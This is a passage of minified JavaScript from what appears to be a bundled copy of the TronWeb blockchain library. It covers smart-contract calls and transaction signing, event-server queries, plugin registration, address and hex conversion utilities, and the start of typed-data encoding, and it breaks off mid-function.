                    return this._parseToken(e)
                }
                ))
            }
            async getReward(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                return t.confirmed = !0,
                this._getReward(e, t)
            }
            async getUnconfirmedReward(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                return t.confirmed = !1,
                this._getReward(e, t)
            }
            async getBrokerage(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                return t.confirmed = !0,
                this._getBrokerage(e, t)
            }
            async getUnconfirmedBrokerage(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                return t.confirmed = !1,
                this._getBrokerage(e, t)
            }
            async _getReward() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 ? arguments[1] : void 0;
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: e
                }]);
                const r = {
                    address: ej(e)
                };
                return this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request("wallet".concat(t.confirmed ? "solidity" : "", "/getReward"), r, "post").then((function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {
                        reward: void 0
                    };
                    if ("undefined" === typeof e.reward)
                        throw new Error("Not found.");
                    return e.reward
                }
                ))
            }
            async _getBrokerage() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 ? arguments[1] : void 0;
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: e
                }]);
                const r = {
                    address: ej(e)
                };
                return this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request("wallet".concat(t.confirmed ? "solidity" : "", "/getBrokerage"), r, "post").then((function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    if ("undefined" === typeof e.brokerage)
                        throw new Error("Not found.");
                    return e.brokerage
                }
                ))
            }
            async getBandwidthPrices() {
                return this.tronWeb.fullNode.request("wallet/getbandwidthprices", {}, "post").then((function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    if ("undefined" === typeof e.prices)
                        throw new Error("Not found.");
                    return e.prices
                }
                ))
            }
            async getEnergyPrices() {
                return this.tronWeb.fullNode.request("wallet/getenergyprices", {}, "post").then((function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    if ("undefined" === typeof e.prices)
                        throw new Error("Not found.");
                    return e.prices
                }
                ))
            }
        }
        const rj = (e, t) => FD(e, t);
        class nj {
            constructor(e, t) {
                (0,
                CI.A)(this, "tronWeb", void 0),
                (0,
                CI.A)(this, "contract", void 0),
                (0,
                CI.A)(this, "abi", void 0),
                (0,
                CI.A)(this, "name", void 0),
                (0,
                CI.A)(this, "inputs", void 0),
                (0,
                CI.A)(this, "outputs", void 0),
                (0,
                CI.A)(this, "functionSelector", void 0),
                (0,
                CI.A)(this, "signature", void 0),
                (0,
                CI.A)(this, "defaultOptions", void 0),
                this.tronWeb = e.tronWeb,
                this.contract = e,
                this.abi = t,
                this.name = t.name || t.type,
                this.inputs = t.inputs || [],
                this.outputs = [],
                "outputs"in t && t.outputs && (this.outputs = t.outputs),
                this.functionSelector = (e => {
                    if ("stateMutability"in e && (e.stateMutability = e.stateMutability ? e.stateMutability.toLowerCase() : "nonpayable"),
                    e.type = e.type ? e.type.toLowerCase() : "",
                    "fallback" === e.type || "receive" === e.type)
                        return "0x";
                    const t = new WV.ethersUtils.Interface([e]);
                    let r;
                    if (r = "event" === e.type ? t.getEvent(e.name) : t.getFunction(e.name),
                    r)
                        return r.format("sighash");
                    throw new Error("unknown function")
                }
                )(t),
                this.signature = EV(this.functionSelector, !1).slice(0, 8),
                this.defaultOptions = {
                    feeLimit: this.tronWeb.feeLimit,
                    callValue: 0,
                    userFeePercentage: 100,
                    shouldPollResponse: !1
                }
            }
            decodeInput(e) {
                const t = JSON.parse(JSON.stringify(this.abi));
                return t.outputs = t.inputs,
                rj(t, "0x" + e)
            }
            onMethod() {
                var e = this;
                let t = "";
                if (this.abi && !/event/i.test(this.abi.type)) {
                    for (var r = arguments.length, n = new Array(r), o = 0; o < r; o++)
                        n[o] = arguments[o];
                    t = ND(this.abi, n)
                }
                return {
                    call: async function() {
                        let r = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                        return r = (0,
                        k.A)((0,
                        k.A)({}, r), {}, {
                            rawParameter: t
                        }),
                        await e._call([], [], r)
                    },
                    send: async function() {
                        let r = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
                          , n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : e.tronWeb.defaultPrivateKey;
                        return r = (0,
                        k.A)((0,
                        k.A)({}, r), {}, {
                            rawParameter: t
                        }),
                        await e._send([], [], r, n)
                    }
                }
            }
            async _call(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                if (e.length !== t.length)
                    throw new Error("Invalid argument count provided");
                if (!this.contract.address)
                    throw new Error("Smart contract is missing address");
                if (!this.contract.deployed)
                    throw new Error("Calling smart contracts requires you to load the contract first");
                if ("stateMutability"in this.abi) {
                    const {stateMutability: e} = this.abi;
                    if (e && !["pure", "view"].includes(e.toLowerCase()))
                        throw new Error('Methods with state mutability "'.concat(e, '" must use send()'))
                }
                r = (0,
                k.A)((0,
                k.A)((0,
                k.A)({}, this.defaultOptions), {}, {
                    from: this.tronWeb.defaultAddress.hex
                }, r), {}, {
                    _isConstant: !0
                });
                const n = t.map(( (t, r) => ({
                    type: e[r],
                    value: t
                })))
                  , o = await this.tronWeb.transactionBuilder.triggerSmartContract(this.contract.address, this.functionSelector, r, n, r.from ? this.tronWeb.address.toHex(r.from) : void 0);
                if (!WV.hasProperty(o, "constant_result"))
                    throw new Error("Failed to execute");
                const i = o.constant_result[0].length;
                if (0 === i || i % 64 === 8) {
                    let e = "The call has been reverted or has thrown an error.";
                    if (0 !== i) {
                        e += " Error message: ";
                        let t = "";
                        const r = o.constant_result[0].substring(8);
                        for (let e = 0; e < i - 8; e += 64)
                            t += this.tronWeb.toUtf8(r.substring(e, e + 64));
                        e += t.replace(/(\u0000|\u000b|\f)+/g, " ").replace(/ +/g, " ").replace(/\s+$/g, "")
                    }
                    throw new Error(e)
                }
                let s = rj(this.abi, "0x" + o.constant_result[0]);
                return 1 === s.length && 1 === Object.keys(s).length && (s = s[0]),
                s
            }
            async _send(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultPrivateKey;
                if (e.length !== t.length)
                    throw new Error("Invalid argument count provided");
                if (!this.contract.address)
                    throw new Error("Smart contract is missing address");
                if (!this.contract.deployed)
                    throw new Error("Calling smart contracts requires you to load the contract first");
                const {stateMutability: o} = this.abi;
                if (["pure", "view"].includes(o.toLowerCase()))
                    throw new Error('Methods with state mutability "'.concat(o, '" must use call()'));
                ["payable"].includes(o.toLowerCase()) || (r.callValue = 0),
                r = (0,
                k.A)((0,
                k.A)({}, this.defaultOptions), {}, {
                    from: this.tronWeb.defaultAddress.hex
                }, r);
                const i = t.map(( (t, r) => ({
                    type: e[r],
                    value: t
                })))
                  , s = n ? this.tronWeb.address.fromPrivateKey(n) : this.tronWeb.defaultAddress.base58
                  , a = await this.tronWeb.transactionBuilder.triggerSmartContract(this.contract.address, this.functionSelector, r, i, this.tronWeb.address.toHex(s));
                if (!a.result || !a.result.result)
                    throw new Error("Unknown error: " + JSON.stringify(a, null, 2));
                const c = await this.tronWeb.trx.sign(a.transaction, n);
                if (!c.signature) {
                    if (!n)
                        throw new Error("Transaction was not signed properly");
                    throw new Error("Invalid private key provided")
                }
                const l = await this.tronWeb.trx.sendRawTransaction(c);
                if (l.code) {
                    const e = {
                        error: l.code,
                        message: l.code
                    };
                    l.message && (e.message = this.tronWeb.toUtf8(l.message));
                    const t = new Error(e.message);
                    throw t.error = l.code,
                    t
                }
                if (!r.shouldPollResponse)
                    return c.txID;
                const u = async e => {
                    if (e === (r.pollTimes || 20)) {
                        const e = new Error("Cannot find result in solidity node");
                        throw e.error = "Cannot find result in solidity node",
                        e.transaction = c,
                        e
                    }
                    const t = await this.tronWeb.trx.getTransactionInfo(c.txID);
                    if (!Object.keys(t).length)
                        return await new Promise((e => setTimeout(e, 3e3))),
                        u(e + 1);
                    if (t.result && "FAILED" === t.result) {
                        const e = new Error(this.tronWeb.toUtf8(t.resMessage));
                        throw e.error = this.tronWeb.toUtf8(t.resMessage),
                        e.transaction = c,
                        e.output = t,
                        e
                    }
                    if (!WV.hasProperty(t, "contractResult")) {
                        const e = new Error("Failed to execute: " + JSON.stringify(t, null, 2));
                        throw e.error = "Failed to execute: " + JSON.stringify(t, null, 2),
                        e.transaction = c,
                        e.output = t,
                        e
                    }
                    if (r.rawResponse)
                        return t;
                    let n = rj(this.abi, "0x" + t.contractResult[0]);
                    return 1 === n.length && 1 === Object.keys(n).length && (n = n[0]),
                    r.keepTxID ? [c.txID, n] : n
                }
                ;
                return u(0)
            }
        }
        class oj {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : []
                  , r = arguments.length > 2 ? arguments[2] : void 0;
                if ((0,
                CI.A)(this, "tronWeb", void 0),
                (0,
                CI.A)(this, "abi", void 0),
                (0,
                CI.A)(this, "address", void 0),
                (0,
                CI.A)(this, "eventListener", void 0),
                (0,
                CI.A)(this, "bytecode", void 0),
                (0,
                CI.A)(this, "deployed", void 0),
                (0,
                CI.A)(this, "lastBlock", void 0),
                (0,
                CI.A)(this, "methods", void 0),
                (0,
                CI.A)(this, "methodInstances", void 0),
                (0,
                CI.A)(this, "props", void 0),
                !e || !(e instanceof lj))
                    throw new Error("Expected instance of TronWeb");
                this.tronWeb = e,
                this.address = r,
                this.abi = t,
                this.eventListener = !1,
                this.bytecode = !1,
                this.deployed = !1,
                this.lastBlock = !1,
                this.methods = {},
                this.methodInstances = {},
                this.props = [],
                WV.address.isAddress(r) ? this.deployed = !0 : this.address = !1,
                this.loadAbi(t)
            }
            hasProperty(e) {
                return this.hasOwnProperty(e) || this.__proto__.hasOwnProperty(e)
            }
            loadAbi(e) {
                this.abi = e,
                this.methods = {},
                this.props.forEach((e => delete this[e])),
                e.forEach((e => {
                    if (!e.type || /constructor|error/i.test(e.type))
                        return;
                    const t = new nj(this,e)
                      , r = t.onMethod.bind(t)
                      , {name: n, functionSelector: o, signature: i} = t;
                    this.methods[n] = r,
                    this.methods[o] = r,
                    this.methods[i] = r,
                    this.methodInstances[n] = t,
                    this.methodInstances[o] = t,
                    this.methodInstances[i] = t,
                    this.hasProperty(n) || (this[n] = r,
                    this.props.push(n)),
                    this.hasProperty(o) || (this[o] = r,
                    this.props.push(o)),
                    this.hasProperty(i) || (this[i] = r,
                    this.props.push(i))
                }
                ))
            }
            decodeInput(e) {
                const t = e.substring(0, 8)
                  , r = e.substring(8);
                if (!this.methodInstances[t])
                    throw new Error("Contract method " + t + " not found");
                return {
                    name: this.methodInstances[t].name,
                    params: this.methodInstances[t].decodeInput(r)
                }
            }
            async new(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultPrivateKey;
                const r = this.tronWeb.address.fromPrivateKey(t)
                  , n = await this.tronWeb.transactionBuilder.createSmartContract(e, r)
                  , o = await this.tronWeb.trx.sign(n, t)
                  , i = await this.tronWeb.trx.sendRawTransaction(o);
                if (i.code)
                    throw {
                        error: i.code,
                        message: this.tronWeb.toUtf8(i.message)
                    };
                return await WV.sleep(3e3),
                this.at(o.contract_address)
            }
            async at(e) {
                try {
                    const t = await this.tronWeb.trx.getContract(e);
                    if (!t.contract_address)
                        throw new Error("Unknown error: " + JSON.stringify(t, null, 2));
                    return this.address = t.contract_address,
                    this.bytecode = t.bytecode,
                    this.deployed = !0,
                    this.loadAbi(t.abi && t.abi.entrys ? t.abi.entrys : []),
                    this
                } catch (t) {
                    if (t.toString().includes("does not exist"))
                        throw new Error("Contract has not been deployed on the network");
                    throw new Error(t)
                }
            }
        }
        class ij {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if ((0,
                CI.A)(this, "tronWeb", void 0),
                (0,
                CI.A)(this, "pluginNoOverride", void 0),
                (0,
                CI.A)(this, "disablePlugins", void 0),
                !e || !(e instanceof lj))
                    throw new Error("Expected instance of TronWeb");
                this.tronWeb = e,
                this.pluginNoOverride = ["register"],
                this.disablePlugins = !!t.disablePlugins
            }
            register(e, t) {
                let r = {
                    requires: "0.0.0",
                    components: {}
                };
                const n = {
                    libs: [],
                    plugged: [],
                    skipped: [],
                    error: void 0
                };
                if (this.disablePlugins)
                    return n.error = "This instance of TronWeb has plugins disabled.",
                    n;
                const o = new e(this.tronWeb);
                if (WV.isFunction(o.pluginInterface) && (r = o.pluginInterface(t)),
                !xD.satisfies(lj.version, r.requires))
                    throw new Error("The plugin is not compatible with this version of TronWeb");
                if (r.fullClass) {
                    const t = o.constructor.name
                      , r = t.substring(0, 1).toLowerCase() + t.substring(1);
                    t !== r && (Object.assign(lj, {
                        [t]: e
                    }),
                    Object.assign(this.tronWeb, {
                        [r]: o
                    }),
                    n.libs.push(t))
                } else
                    for (const i in r.components) {
                        if (!this.tronWeb.hasOwnProperty(i))
                            continue;
                        const e = r.components[i]
                          , t = this.tronWeb[i].pluginNoOverride || [];
                        for (const r in e)
                            "constructor" === r || this.tronWeb[i][r] && (t.includes(r) || /^_/.test(r)) ? n.skipped.push(r) : (this.tronWeb[i][r] = e[r].bind(this.tronWeb[i]),
                            n.plugged.push(r))
                    }
                return n
            }
        }
        class sj {
            constructor(e) {
                if ((0,
                CI.A)(this, "tronWeb", void 0),
                !e || !(e instanceof lj))
                    throw new Error("Expected instance of TronWeb");
                this.tronWeb = e
            }
            setServer(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "healthcheck";
                if (!e)
                    return this.tronWeb.eventServer = void 0;
                if (WV.isString(e) && (e = new SD(e)),
                !this.tronWeb.isValidProvider(e))
                    throw new Error("Invalid event server provided");
                this.tronWeb.eventServer = e,
                this.tronWeb.eventServer.isConnected = () => this.tronWeb.eventServer.request(t).then(( () => !0)).catch(( () => !1))
            }
            async getEventsByContractAddress(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                const r = Object.assign({
                    limit: 20
                }, t)
                  , {eventName: n, blockNumber: o, onlyUnconfirmed: i, onlyConfirmed: s, minBlockTimestamp: a, maxBlockTimestamp: c, orderBy: l, fingerprint: u} = r;
                let {limit: d} = r;
                if (!this.tronWeb.eventServer)
                    throw new Error("No event server configured");
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid contract address provided");
                if ("undefined" !== typeof a && !WV.isInteger(a))
                    throw new Error("Invalid minBlockTimestamp provided");
                if ("undefined" !== typeof c && !WV.isInteger(c))
                    throw new Error("Invalid maxBlockTimestamp provided");
                WV.isInteger(d) && d > 200 && (console.warn("Defaulting to maximum accepted limit: 200"),
                d = 200);
                const h = {};
                n && (h.event_name = n),
                o && (h.block_number = o),
                "boolean" === typeof i && (h.only_unconfirmed = i),
                "boolean" === typeof s && (h.only_confirmed = s),
                a && (h.min_block_timestamp = a),
                c && (h.max_block_timestamp = c),
                l && (h.order_by = l),
                u && (h.fingerprint = u),
                WV.isInteger(d) && (h.limit = d);
                const f = await this.tronWeb.eventServer.request("v1/contracts/".concat(this.tronWeb.address.fromHex(e), "/events?").concat(new URLSearchParams(h).toString()));
                if (f.success)
                    return f;
                throw new Error(f.error)
            }
            async getEventsByTransactionID(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (!this.tronWeb.eventServer)
                    throw new Error("No event server configured");
                const r = {};
                return "boolean" === typeof t.only_unconfirmed && (r.only_unconfirmed = t.only_unconfirmed),
                "boolean" === typeof t.only_confirmed && (r.only_confirmed = t.only_confirmed),
                this.tronWeb.eventServer.request("v1/transactions/".concat(e, "/events?").concat(new URLSearchParams(r).toString())).then((e => {
                    if (e.success)
                        return e;
                    throw new Error(JSON.parse(e.error).message)
                }
                ))
            }
            async getEventsByBlockNumber(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (!this.tronWeb.eventServer)
                    throw new Error("No event server configured");
                const r = {};
                return "boolean" === typeof t.only_confirmed && (r.only_confirmed = t.only_confirmed),
                t.limit && (r.limit = t.limit),
                t.fingerprint && (r.fingerprint = t.fingerprint),
                this.tronWeb.eventServer.request("v1/blocks/".concat(e, "/events?").concat(new URLSearchParams(r).toString())).then((e => {
                    if (e.success)
                        return e;
                    throw new Error(e.error)
                }
                ))
            }
            async getEventsOfLatestBlock() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                if (!this.tronWeb.eventServer)
                    throw new Error("No event server configured");
                const t = {};
                return "boolean" === typeof e.only_confirmed && (t.only_confirmed = e.only_confirmed),
                this.tronWeb.eventServer.request("v1/blocks/latest/events?".concat(new URLSearchParams(t).toString())).then((e => {
                    if (e.success)
                        return e;
                    throw new Error(e.error)
                }
                ))
            }
        }
        const aj = "4.7.1";
        function cj(e) {
            return !!e && "object" === typeof e && (!!e.fullNode || !!e.fullHost)
        }
        class lj extends BD {
            constructor(e) {
                let t, r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "", n = arguments.length > 2 ? arguments[2] : void 0, o = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "";
                super(),
                (0,
                CI.A)(this, "providers", void 0),
                (0,
                CI.A)(this, "BigNumber", void 0),
                (0,
                CI.A)(this, "transactionBuilder", void 0),
                (0,
                CI.A)(this, "trx", void 0),
                (0,
                CI.A)(this, "plugin", void 0),
                (0,
                CI.A)(this, "event", void 0),
                (0,
                CI.A)(this, "version", void 0),
                (0,
                CI.A)(this, "utils", void 0),
                (0,
                CI.A)(this, "defaultBlock", void 0),
                (0,
                CI.A)(this, "defaultPrivateKey", void 0),
                (0,
                CI.A)(this, "defaultAddress", void 0),
                (0,
                CI.A)(this, "fullnodeVersion", void 0),
                (0,
                CI.A)(this, "feeLimit", void 0),
                (0,
                CI.A)(this, "fullNode", void 0),
                (0,
                CI.A)(this, "solidityNode", void 0),
                (0,
                CI.A)(this, "eventServer", void 0),
                (0,
                CI.A)(this, "address", void 0),
                (0,
                CI.A)(this, "sha3", void 0),
                (0,
                CI.A)(this, "toHex", void 0),
                (0,
                CI.A)(this, "toUtf8", void 0),
                (0,
                CI.A)(this, "fromUtf8", void 0),
                (0,
                CI.A)(this, "toAscii", void 0),
                (0,
                CI.A)(this, "fromAscii", void 0),
                (0,
                CI.A)(this, "toDecimal", void 0),
                (0,
                CI.A)(this, "fromDecimal", void 0),
                (0,
                CI.A)(this, "fromSun", void 0),
                (0,
                CI.A)(this, "toSun", void 0),
                (0,
                CI.A)(this, "toBigNumber", void 0),
                (0,
                CI.A)(this, "isAddress", void 0),
                (0,
                CI.A)(this, "createAccount", void 0),
                (0,
                CI.A)(this, "createRandom", void 0),
                (0,
                CI.A)(this, "fromMnemonic", void 0);
                let i = !1
                  , s = !1;
                cj(e) ? (t = e.fullNode || e.fullHost,
                r = e.solidityNode || e.fullHost,
                n = e.eventServer || e.fullHost,
                i = e.headers || !1,
                s = e.eventHeaders || i,
                o = e.privateKey) : t = e,
                WV.isString(t) && (t = new ID.HttpProvider(t)),
                WV.isString(r) && (r = new ID.HttpProvider(r)),
                WV.isString(n) && (n = new ID.HttpProvider(n)),
                this.event = new sj(this),
                this.transactionBuilder = new JL(this),
                this.trx = new tj(this),
                this.plugin = new ij(this,{
                    disablePlugins: !!cj(e) && e.disablePlugins
                }),
                this.utils = WV,
                this.setFullNode(t),
                this.setSolidityNode(r),
                this.setEventServer(n),
                this.providers = ID,
                this.BigNumber = nS,
                this.defaultBlock = !1,
                this.defaultPrivateKey = !1,
                this.defaultAddress = {
                    hex: !1,
                    base58: !1
                },
                this.version = lj.version,
                this.sha3 = lj.sha3,
                this.fromUtf8 = lj.fromUtf8,
                this.address = lj.address,
                this.toAscii = lj.toAscii,
                this.toUtf8 = lj.toUtf8,
                this.isAddress = lj.isAddress,
                this.fromAscii = lj.fromAscii,
                this.toHex = lj.toHex,
                this.toBigNumber = lj.toBigNumber,
                this.toDecimal = lj.toDecimal,
                this.fromDecimal = lj.fromDecimal,
                this.toSun = lj.toSun,
                this.fromSun = lj.fromSun,
                this.createAccount = lj.createAccount,
                this.createRandom = lj.createRandom,
                this.fromMnemonic = lj.fromMnemonic,
                o && this.setPrivateKey(o),
                this.fullnodeVersion = aj,
                this.feeLimit = 15e7,
                i && this.setFullNodeHeader(i),
                s && this.setEventHeader(s)
            }
            async getFullnodeVersion() {
                try {
                    const e = await this.trx.getNodeInfo();
                    this.fullnodeVersion = e.configNodeInfo.codeVersion,
                    2 === this.fullnodeVersion.split(".").length && (this.fullnodeVersion += ".0")
                } catch (e) {
                    this.fullnodeVersion = aj
                }
            }
            setDefaultBlock() {
                let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                if ([!1, "latest", "earliest", 0].includes(e))
                    return this.defaultBlock = e;
                if (!WV.isInteger(e) || !e)
                    throw new Error("Invalid block ID provided");
                return this.defaultBlock = Math.abs(e)
            }
            setPrivateKey(e) {
                try {
                    this.setAddress(lj.address.fromPrivateKey(e))
                } catch (t) {
                    throw new Error("Invalid private key provided")
                }
                this.defaultPrivateKey = e,
                this.emit("privateKeyChanged", e)
            }
            setAddress(e) {
                if (!lj.isAddress(e))
                    throw new Error("Invalid address provided");
                const t = lj.address.toHex(e)
                  , r = lj.address.fromHex(e);
                this.defaultPrivateKey && lj.address.fromPrivateKey(this.defaultPrivateKey) !== r && (this.defaultPrivateKey = !1),
                this.defaultAddress = {
                    hex: t,
                    base58: r
                },
                this.emit("addressChanged", {
                    hex: t,
                    base58: r
                })
            }
            fullnodeSatisfies(e) {
                return xD.satisfies(this.fullnodeVersion, e)
            }
            isValidProvider(e) {
                return Object.values(ID).some((t => e instanceof t))
            }
            setFullNode(e) {
                if (dS(e) && (e = new ID.HttpProvider(e)),
                !this.isValidProvider(e))
                    throw new Error("Invalid full node provided");
                this.fullNode = e,
                this.fullNode.setStatusPage("wallet/getnowblock")
            }
            setSolidityNode(e) {
                if (WV.isString(e) && (e = new ID.HttpProvider(e)),
                !this.isValidProvider(e))
                    throw new Error("Invalid solidity node provided");
                this.solidityNode = e,
                this.solidityNode.setStatusPage("walletsolidity/getnowblock")
            }
            setEventServer(e, t) {
                this.event.setServer(e, t)
            }
            setHeader() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                const t = new ID.HttpProvider(this.fullNode.host,3e4,"","",e)
                  , r = new ID.HttpProvider(this.solidityNode.host,3e4,"","",e)
                  , n = new ID.HttpProvider(this.eventServer.host,3e4,"","",e);
                this.setFullNode(t),
                this.setSolidityNode(r),
                this.setEventServer(n)
            }
            setFullNodeHeader() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                const t = new ID.HttpProvider(this.fullNode.host,3e4,"","",e)
                  , r = new ID.HttpProvider(this.solidityNode.host,3e4,"","",e);
                this.setFullNode(t),
                this.setSolidityNode(r)
            }
            setEventHeader() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                const t = new ID.HttpProvider(this.eventServer.host,3e4,"","",e);
                this.setEventServer(t)
            }
            currentProviders() {
                return {
                    fullNode: this.fullNode,
                    solidityNode: this.solidityNode,
                    eventServer: this.eventServer
                }
            }
            currentProvider() {
                return this.currentProviders()
            }
            getEventResult() {
                return this.event.getEventsByContractAddress(...arguments)
            }
            getEventByTransactionID() {
                return this.event.getEventsByTransactionID(...arguments)
            }
            contract() {
                return new oj(this,arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [],arguments.length > 1 ? arguments[1] : void 0)
            }
            static get address() {
                return {
                    fromHex: e => eF(e),
                    toHex: e => tF(e),
                    toChecksumAddress: e => rF(e),
                    isChecksumAddress: e => nF(e),
                    fromPrivateKey(e) {
                        return oF(e, arguments.length > 1 && void 0 !== arguments[1] && arguments[1])
                    }
                }
            }
            static sha3(e) {
                return (!(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1] ? "0x" : "") + ix(Buffer.from(e, "utf-8")).toString().substring(2)
            }
            static toHex(e) {
                if (WV.isBoolean(e))
                    return lj.fromDecimal(+e);
                if (WV.isBigNumber(e))
                    return lj.fromDecimal(e);
                if ("object" === typeof e)
                    return lj.fromUtf8(JSON.stringify(e));
                if (WV.isString(e)) {
                    if (/^(-|)0x/.test(e))
                        return e;
                    if (!isFinite(e) || /^\s*$/.test(e))
                        return lj.fromUtf8(e)
                }
                const t = lj.fromDecimal(e);
                if ("0xNaN" === t)
                    throw new Error("The passed value is not convertible to a hex string");
                return t
            }
            static toUtf8(e) {
                if (WV.isHex(e))
                    return e = e.replace(/^0x/, ""),
                    Buffer.from(e, "hex").toString("utf8");
                throw new Error("The passed value is not a valid hex string")
            }
            static fromUtf8(e) {
                if (!WV.isString(e))
                    throw new Error("The passed value is not a valid utf-8 string");
                return "0x" + Buffer.from(e, "utf8").toString("hex")
            }
            static toAscii(e) {
                if (WV.isHex(e)) {
                    let t = ""
                      , r = 0;
                    const n = e.length;
                    for ("0x" === e.substring(0, 2) && (r = 2); r < n; r += 2) {
                        const n = parseInt(e.substr(r, 2), 16);
                        t += String.fromCharCode(n)
                    }
                    return t
                }
                throw new Error("The passed value is not a valid hex string")
            }
            static fromAscii(e, t) {
                if (!WV.isString(e))
                    throw new Error("The passed value is not a valid utf-8 string");
                return "0x" + Buffer.from(e, "ascii").toString("hex").padEnd(t, "0")
            }
            static toDecimal(e) {
                return lj.toBigNumber(e).toNumber()
            }
            static fromDecimal(e) {
                const t = lj.toBigNumber(e)
                  , r = t.toString(16);
                return t.isLessThan(0) ? "-0x" + r.substr(1) : "0x" + r
            }
            static fromSun(e) {
                const t = lj.toBigNumber(e).div(1e6);
                return WV.isBigNumber(e) ? t : t.toString(10)
            }
            static toSun(e) {
                const t = lj.toBigNumber(e).times(1e6);
                return WV.isBigNumber(e) ? t : t.toString(10)
            }
            static toBigNumber() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
                return WV.isBigNumber(e) ? e : WV.isString(e) && /^(-|)0x/.test(e) ? new nS(e.replace("0x", ""),16) : new nS(e.toString(10),10)
            }
            static isAddress() {
                return iF(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "")
            }
            static async createAccount() {
                return WV.accounts.generateAccount()
            }
            static createRandom() {
                return WV.accounts.generateRandom(...arguments)
            }
            static fromMnemonic() {
                return WV.accounts.generateAccountWithMnemonic(...arguments)
            }
            async isConnected() {
                return {
                    fullNode: await this.fullNode.isConnected(),
                    solidityNode: await this.solidityNode.isConnected(),
                    eventServer: this.eventServer && await this.eventServer.isConnected()
                }
            }
        }
        (0,
        CI.A)(lj, "version", "6.0.3");
        const uj = lj;
        const dj = new Uint8Array(32);
        dj.fill(0);
        const hj = BigInt(-1)
          , fj = BigInt(0)
          , pj = BigInt(1)
          , gj = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
        const yj = lI(pj, 32)
          , mj = lI(fj, 32)
          , bj = {
            name: "string",
            version: "string",
            chainId: "uint256",
            verifyingContract: "address",
            salt: "bytes32"
        }
          , vj = ["name", "version", "chainId", "verifyingContract", "salt"];
        function wj(e) {
            return function(t) {
                return NS("string" === typeof t, "invalid domain value for ".concat(JSON.stringify(e)), "domain.".concat(e), t),
                t
            }
        }
        const Tj = {
            name: wj("name"),
            version: wj("version"),
            chainId: function(e) {
                const t = oI(e, "domain.chainId");
                return NS(t >= 0, "invalid chain ID", "domain.chainId", e),
                Number.isSafeInteger(t) ? Number(t) : dI(t)
            },
            verifyingContract: function(e) {
                try {
                    return (t = e,
                    lj.address.toHex(t)).toLowerCase()
                } catch (r) {}
                var t;
                NS(!1, 'invalid domain value "verifyingContract"', "domain.verifyingContract", e)
            },
            salt: function(e) {
                const t = zS(e, "domain.salt");
                return NS(32 === t.length, 'invalid domain value "salt"', "domain.salt", e),
                $S(t)
            }
        };
        function Aj(e) {
            {
                const t = e.match(/^(u?)int(\d*)$/);
                if (t) {
                    const r = "" === t[1]
                      , n = parseInt(t[2] || "256");
                    NS(n % 8 === 0 && 0 !== n && n <= 256 && (null == t[2] || t[2] === String(n)), "invalid numeric width", "type", e);
                    const o = nI(gj, r ? n - 1 : n)
                      , i = r ? (o + pj) * hj : fj;
                    return function(t) {
                        const n = oI(t, "value");
                        return NS(n >= i && n <= o, "value out-of-bounds for ".concat(e), "value", n),
                        lI(r ? rI(n, 256) : n, 32)
                    }
                }
            }
            {
                const t = e.match(/^bytes(\d+)$/);
                if (t) {
                    const r = parseInt(t[1]);
                    return NS(0 !== r && r <= 32 && t[1] === String(r), "invalid bytes width", "type", e),
                    function(t) {
                        return NS(zS(t).length === r, "invalid length for ".concat(e), "value", t),
                        function(e) {
                            const t = zS(e)
                              , r = t.length % 32;
                            return r ? KS([t, dj.slice(r)]) : $S(t)
                        }(t)
                    }
                }
            }
            switch (e) {
            case "trcToken":
                return Aj("uint256");
            case "address":
                return function(e) {
                    return XS((t = e,
                    lj.address.toHex(t).replace(JN, "0x")), 32);
                    var t
                }
                ;
            case "bool":
                return function(e) {
                    return e ? yj : mj
                }
                ;
            case "bytes":
                return function(e) {
                    return ix(e)
                }
                ;
            case "string":
